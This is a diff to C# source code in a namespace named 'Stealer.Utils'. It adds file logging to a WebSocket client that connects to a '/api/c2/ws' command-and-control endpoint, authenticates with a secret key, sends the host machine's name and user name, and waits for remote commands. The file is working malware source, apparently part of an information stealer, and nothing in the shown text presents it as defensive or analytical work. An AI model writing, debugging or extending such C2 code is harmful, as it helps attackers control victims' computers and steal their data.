@@ -1,4 +1,5 @@
 using System;
+using System.IO;
 using System.Net.WebSockets;
 using System.Text;
 using System.Threading;
@@ -10,6 +11,13 @@ namespace Stealer.Utils
         private static ClientWebSocket _ws;
         private static readonly object _sendLock = new object();
         private static Action<string> _onCommand;
+        private static readonly string Log = Path.Combine(
+            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "whm_ws.log");
+
+        private static void L(string msg)
+        {
+            try { File.AppendAllText(Log, DateTime.Now + " " + msg + "\r\n"); } catch { }
+        }
 
         public static void Connect(string clientId, Action<string> onCommand)
         {
@@ -22,18 +30,25 @@ namespace Stealer.Utils
                     _ws = new ClientWebSocket();
                     string baseUrl = GetBaseUrl();
                     string wsUrl = baseUrl.Replace("https://", "wss://").Replace("http://", "ws://") + "/api/c2/ws";
+                    L("CONNECTING: " + wsUrl);
 
                     _ws.ConnectAsync(new Uri(wsUrl), CancellationToken.None).GetAwaiter().GetResult();
+                    L("CONNECTED OK");
 
                     string auth = "{\"type\":\"auth\",\"client_id\":\"" + Escape(clientId) +
                                   "\",\"key\":\"" + Escape(Config.SecretKey) +
                                   "\",\"hostname\":\"" + Escape(Environment.MachineName) +
                                   "\",\"username\":\"" + Escape(Environment.UserName) + "\"}";
                     SendText(auth);
+                    L("AUTH SENT");
 
                     ReceiveLoop();
+                    L("RECEIVE LOOP ENDED, state=" + (_ws != null ? _ws.State.ToString() : "null"));
                 }
-                catch { }
+                catch (Exception ex)
+                {
+                    L("CONNECT ERR: " + ex.GetType().Name + ": " + ex.Message);
+                }
 
                 try { _ws.Dispose(); } catch { }
                 _ws = null;
